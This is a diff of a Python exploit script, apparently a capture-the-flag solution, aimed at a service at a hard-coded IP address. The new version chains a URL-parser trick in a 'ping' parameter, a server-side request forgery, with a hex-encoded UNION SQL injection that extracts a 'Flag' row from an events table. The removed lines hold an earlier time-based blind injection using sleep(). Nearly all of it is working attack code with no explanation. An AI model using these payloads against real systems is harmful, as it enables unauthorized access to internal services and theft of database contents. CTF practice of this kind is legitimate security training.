@@ -1,28 +1,23 @@
 import requests 
-import time 
-import string 
 
 url = "http://52.231.137.27:37221"
-url = "http://localhost:37221/"
-flag = "" 
+# url = "http://localhost:37221/"
 
-# sql = f" union select 1\nfrom (select if(ascii(substr(body from {i} for 1))={ord(j)},sleep(2),0) XXX from events GROUP BY name HAVING name=\"Flag\") k; --"
-sql = " union select 1\nfrom %28select 1 XXX%29 X union select body from events GROUP BY name HAVING name=%22Flag%22%3B -- ".replace(" ", "%20").replace("\n","%0A")
-# sql = "Flag"
-# start = time.time() 
+x = b" union select 1\n.* from (select * from events "
+x += b"union/**/select * from (select 1)a "
+x += b"join (select 0x36646364346365323364383865326565393536386261353436633030376336336439313331633162)b "
+x += b"join (select 0x36646364346365323364383865326565393536386261353436633030376336336439313331633162)c "
+x += b"join (select body from events offset 1 rows fetch next 1 rows only)d offset 3 rows) XXX;-- -"
+
+sql = ''
+for i in range(len(x)):
+    sql += '%%%02x' % (x[i])
+
 r = requests.get(
-            f"{url}", 
-            params={
-                "action": "ping",
-                "arg": f"http://localhost:80\@.cce.cstec.kr|?action=db_show_event_detail&db_arg_event_name={sql}&db_arg_writer=&db_arg_password=",
-                # "arg": f"http://localhost:80\@.cce.cstec.kr|?action=db_show_event_detail&db_arg_event_name=%0A",
-                # "arg": "http://localhost:80\@.cce.cstec.kr|/?action=db_version"
-            }
-        )
-        # end = time.time() 
-        # print(r.text)
+    f"{url}", 
+    params={
+        "action": "ping",
+        "arg": f"http://localhost:80\@.cce.cstec.kr|?action=db_show_event_detail&db_arg_event_name={sql}&db_arg_writer=A&db_arg_password=A",
+    }
+)
 print(r.text)
-        # if end - start >= 2: 
-        #     flag += j
-        #     print(flag) 
-        #     break 
